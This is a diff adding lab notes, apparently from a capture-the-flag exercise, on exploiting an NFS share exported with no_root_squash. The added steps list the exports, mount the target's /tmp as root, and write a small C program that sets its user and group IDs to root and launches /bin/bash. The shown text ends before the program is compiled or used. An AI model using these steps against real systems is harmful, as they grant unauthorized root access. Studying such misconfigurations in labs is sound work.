@@ -55,3 +55,32 @@ cat /etc/exports
 Note: we've found that no_root_squash option is present for /tmp share.
 
 EXPLOITATION:
+
+IN ATTACKER VM:
+
+(a) showmount -e TARGET_IP 
+
+Explanation:
+option : -e means list all exports
+The output:
+Export list for 10.10.240.117:
+/tmp *
+
+(b)
+So we know that /tmp of target is shared
+
+(c) create a folder in attacker machine
+
+mkdir /tmp/1
+
+(d) Now mount target's /tmp in attacker's /tmp/1
+
+mount -o rw,vers=3 10.10.240.117:/tmp /tmp/1
+
+(we must be as root in attacker machine)
+
+(c) Now create exploit in shared
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
+
+
+
